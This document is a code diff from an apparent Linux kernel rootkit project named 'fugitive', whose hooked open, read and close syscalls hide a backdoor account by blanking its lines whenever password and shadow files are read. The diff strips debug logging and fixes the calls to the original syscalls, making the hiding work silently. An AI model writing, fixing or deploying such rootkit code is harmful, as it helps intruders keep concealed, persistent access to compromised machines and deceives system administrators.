@@ -276,9 +276,7 @@ asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
     } else if(!strcmp(SHADOW_PATH, pathname)){
         erase = SHAD_E;
     }
-if (erase) printk("want erase (%s)\n", pathname);
-else printk("[%s]\n", pathname);
-    return (*((asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original))(pathname, flags, mode);
+    return (*((asmlinkage int (*)(char *, int, mode_t)) fugitive__hooks[1].original))(pathname, flags, mode);
 }
 
 /* evil syscall read. deletes evil account info in buffer */
@@ -287,7 +285,7 @@ asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
     char *hidden = NULL;
     char *ptr = NULL;
 
-    ret = (*((asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original))(fd, buf, count);
+    ret = (*((asmlinkage ssize_t (*)(int, void *, size_t)) fugitive__hooks[2].original))(fd, buf, count);
 
     switch(erase){
         case PASS_E:
@@ -303,12 +301,10 @@ asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
     }
 
     if(hidden != NULL){
-printk("want erase\n");
         ptr = strnstr(buf, hidden, count);
         if(ptr != NULL)
             memset(ptr, '\0', strlen(hidden));
     }
-else printk("want erase\n");
 
     return ret;
 }
@@ -317,9 +313,7 @@ else printk("want erase\n");
 asmlinkage int this_is_requiem(int fd){
     if(erase){
         erase = NONE;
-printk("want no erase\n");
     }
-else printk("nope\n");
-    return (*((asmlinkage int (*)(int)) &fugitive__hooks[0].original))(fd);
+    return (*((asmlinkage int (*)(int)) fugitive__hooks[0].original))(fd);
 }
 
